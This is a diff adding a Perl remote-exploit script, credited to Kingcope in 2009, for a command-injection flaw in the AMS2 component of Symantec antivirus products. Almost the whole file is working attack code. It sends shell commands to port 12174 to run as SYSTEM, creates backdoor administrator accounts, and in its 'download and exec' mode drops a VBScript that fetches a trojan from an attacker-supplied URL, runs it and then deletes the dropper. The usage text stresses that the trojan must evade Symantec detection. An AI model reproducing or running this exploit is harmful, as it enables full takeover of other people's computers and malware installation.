@@ -1,0 +1,170 @@
+#The AMS2 (Alert Management Systems 2) component of multiple Symantec products is prone to a remote #command-execution vulnerability because the software fails to adequately sanitize user-supplied #input.
+
+#Successfully exploiting this issue will allow an attacker to execute arbitrary commands with #SYSTEM-level privileges, completely compromising affected computers. Failed exploit attempts will #result in a denial-of-service condition. 
+
+# # # # # # # # # # # # # # # # # # # # # # # # #
+### SYMANTEC AV w/ INTEL FILE TRANSFER SERVICE
+### REMOTE SYSTEM LEVEL EXPLOIT
+### USE AT YOUR OWN RISK!
+### by Kingcope in 2009
+# # # # # # # # # # # # # # # # # # # # # # # # #
+
+use IO::Socket;
+
+sub rce {
+($target, $cmmd) = @_;
+$sock = IO::Socket::INET->new(PeerAddr => $target,
+                              PeerPort => '12174',
+                              Proto    => 'tcp') || goto lbl;
+$magic = sprintf("%d", 0xc0d3b4b3);
+$command = "cmd.exe /C $cmmd | exit $magic";
+$cmd = "$command";
+$req = "\x00\x00\x00\x00" . pack("v", length($cmd)+1) . $cmd . "\x00";
+print $sock $req;
+
+read($sock, $res, 0x14);
+$resp = substr($res, 0x10, 4);
+if ($resp eq pack("L", 0xc0d3b4b3)) {
+	print "SUCCESS!\n";	
+} else {
+	print "COMMAND FAILED\n";
+}
+
+return;
+lbl:
+print "PORT CLOSED\n";
+exit;
+
+}
+
+sub usage {
+	print "usage: perl xpl.pl [-a <target> <username> <password>] [-a2 <target> <username> <password> <administrators groupname> [-d <target> <trojan url>] [-t <target> ]\n";
+	print "-a IS ADDUSER WITH SID METHOD\n";
+	print "-a2 IS ADDUSER BY NAME\n";
+	print "-t IS TEST\n";	
+	print "-d IS DOWNLOAD AND EXEC, EXE FILE MUST NOT BE DETECTABLE BY SYMANTEC AV\n";
+	print "Example: perl xpl.pl -a www.symantec.com r00t p455\n";
+	exit;
+}
+
+print "\n*** Symantec AV Remote Exploit\n*** by Kingcope in 2009\n\n";
+if ($#ARGV < 1) {
+usage();
+}
+$specify = $ARGV[0];
+$target = $ARGV[1];
+
+if ($specify eq "-d" && $#ARGV != 2) {
+	usage();	
+}
+
+if ($specify eq "-a" && $#ARGV != 3) {
+	usage();	
+}
+
+if ($specify eq "-a2" && $#ARGV != 4) {
+	usage();	
+}
+
+if ($specify eq "-t" && $#ARGV != 1) {
+	usage();	
+}
+
+$|=1;
+
+if ($specify eq "-d") {
+$trojanurl = $ARGV[2];
+
+$getcred[0] = "echo Function SaveBinaryData(FileName, ByteArray) > c:\\getcreds.vbs";
+$getcred[1] = "echo Const adTypeBinary = 1 >> c:\\getcreds.vbs";
+$getcred[2] = "echo Const adSaveCreateOverWrite = 2 >> c:\\getcreds.vbs";
+$getcred[3] = "echo Dim BinaryStream >> c:\\getcreds.vbs";
+$getcred[4] = "echo Set BinaryStream = CreateObject(\"ADODB.Stream\") >> c:\\getcreds.vbs";
+$getcred[5] = "echo BinaryStream.Type = adTypeBinary >> c:\\getcreds.vbs";
+$getcred[6] = "echo BinaryStream.Open >> c:\\getcreds.vbs";
+$getcred[7] = "echo BinaryStream.Write ByteArray >> c:\\getcreds.vbs";
+$getcred[8] = "echo BinaryStream.SaveToFile FileName, adSaveCreateOverWrite >> c:\\getcreds.vbs";
+$getcred[9] = "echo End Function >> c:\\getcreds.vbs";
+$getcred[10] = "echo Sub HTTPDownload( myURL, myPath ) >> c:\\getcreds.vbs";
+$getcred[11] = "echo Set objHTTP = CreateObject( \"WinHttp.WinHttpRequest.5.1\" ) >> c:\\getcreds.vbs";
+$getcred[12] = "echo objHTTP.Open \"GET\", myURL, False >> c:\\getcreds.vbs";
+$getcred[13] = "echo objHTTP.Send >> c:\\getcreds.vbs";
+$getcred[14] = "echo SaveBinaryData myPath, objHTTP.ResponseBody >> c:\\getcreds.vbs";
+$getcred[15] = "echo End Sub >> c:\\getcreds.vbs";
+$getcred[16] = "echo HTTPDownload \"$trojanurl\", \"c:\\installer.exe\" >> c:\\getcreds.vbs";
+$getcred[17] = "echo Set shell = CreateObject(\"WScript.Shell\") >> c:\\getcreds.vbs";
+$getcred[18] = "echo Set objEnv = shell.Environment(\"Process\")  >> c:\\getcreds.vbs";
+$getcred[19] = "echo Set objEnv2 = shell.Environment(\"User\")  >> c:\\getcreds.vbs";
+$getcred[20] = "echo Set objEnv3 = shell.Environment(\"System\")  >> c:\\getcreds.vbs";
+$getcred[21] = "echo sysRoot = objEnv(\"systemroot\") >> c:\\getcreds.vbs";
+$getcred[22] = "echo userProfile = objEnv(\"userprofile\") >> c:\\getcreds.vbs";
+$getcred[23] = "echo objEnv2(\"Path\") = sysRoot ^& \";\" ^& sysRoot ^&\"\\system32;\" ^& sysRoot ^& \"\\temp;\" ^& sysRoot ^& \"\\wbem\" >> c:\\getcreds.vbs";
+$getcred[24] = "echo objEnv3(\"Path\") = sysRoot ^& \";\" ^& sysRoot ^&\"\\system32;\" ^& sysRoot ^& \"\\temp;\" ^& sysRoot ^& \"\\wbem\" >> c:\\getcreds.vbs";
+$getcred[25] = "echo objEnv2(\"TEMP\") = sysRoot ^& \"\\temp\" >> c:\\getcreds.vbs";
+$getcred[26] = "echo objEnv2(\"TMP\") =  sysRoot ^& \"\\temp\" >> c:\\getcreds.vbs";
+$getcred[27] = "echo objEnv3(\"TEMP\") = sysRoot ^& \"\\temp\" >> c:\\getcreds.vbs";
+$getcred[28] = "echo objEnv3(\"TMP\") =  sysRoot ^& \"\\temp\" >> c:\\getcreds.vbs";
+$getcred[29] = "echo shell.CurrentDirectory = \"c:\\\" >> c:\\getcreds.vbs";
+$getcred[30] = "echo shell.Run Chr(34) ^& \"c:\\installer.exe\" ^& Chr(34), 1, false >> c:\\getcreds.vbs";
+$getcred[31] = "echo Set shell = Nothing >> c:\\getcreds.vbs";
+
+$commandx = $getcred[0];
+for ($k=1;$k<=31;$k++) {
+	$commandx .= " && ".$getcred[$k];
+}
+
+print "UPLOAD AND RUN KIT .. ";
+rce($target, "$commandx && c:\\getcreds.vbs");
+sleep(3);
+print "\n";
+print "DELETE KIT FETCHER .. ";
+rce($target, "del c:\\getcreds.vbs");
+print "COMPLETED....";
+}
+
+if ($specify eq "-a") {
+$getcreds[0] = "echo strComputer = \".\" > c:\\getcred.vbs";
+$getcreds[1] = "echo strSID = \"S-1-5-32-544\" >> c:\\getcred.vbs";
+$getcreds[2] = "echo Set objWMIService = GetObject(\"winmgmts:\\\\\" ^& strComputer ^& \"\\root\\cimv2\") >> c:\\getcred.vbs";
+$getcreds[3] = "echo Set objSID = objWMIService.Get(\"Win32_SID='\" ^& strSID ^& \"'\") >> c:\\getcred.vbs";
+$getcreds[4] = "echo groupname=objSID.AccountName >> c:\\getcred.vbs";
+$getcreds[5] = "echo Set objNetwork = WScript.CreateObject(\"WScript.Network\") >> c:\\getcred.vbs";
+$getcreds[6] = "echo Set objGroup = GetObject(\"WinNT://\" ^& objNetwork.ComputerName ^& \"/\"^&groupname^&\",group\") >> c:\\getcred.vbs";
+$getcreds[7] = "echo Admin_Name = WScript.Arguments(0) >> c:\\getcred.vbs";
+$getcreds[8] = "echo Path = \"WinNT://\" ^& objNetwork.ComputerName ^& \"/\" ^& Admin_Name >> c:\\getcred.vbs";
+$getcreds[9] = "echo If Not objGroup.IsMember(Path) Then  >> c:\\getcred.vbs";
+$getcreds[10] = "echo objGroup.Add(Path) >> c:\\getcred.vbs";
+$getcreds[11] = "echo End If >> c:\\getcred.vbs";
+$getcreds[12] = "echo Set objGroup = Nothing >> c:\\getcred.vbs";
+$getcreds[13] = "echo set objNetwork = Nothing  >> c:\\getcred.vbs";
+
+$username = $ARGV[2];
+$password = $ARGV[3];
+
+$commandxx = $getcreds[0];
+for ($k=1;$k<=13;$k++) {
+	$commandxx .= " && " . $getcreds[$k];
+}
+
+print "RUN ADD USER .. ";
+rce($target, "net user $username $password /add");
+sleep(3);
+print "\n";
+print "RUN ADD TO GROUP .. ";
+rce($target, "$commandxx && c:\\getcred.vbs $username && del c:\\getcred.vbs");
+}
+
+if ($specify eq "-a2") {
+	
+$username = $ARGV[2];
+$password = $ARGV[3];	
+$admin = $ARGV[4];
+	
+print "RUN ADD USER .. ";
+rce($target, "net user $username $password /add && net localgroup $admin $username /add");
+}
+
+if ($specify eq "-t") {
+print "RUN TEST $target .. ";
+rce($target, "echo ELITE .");
+}
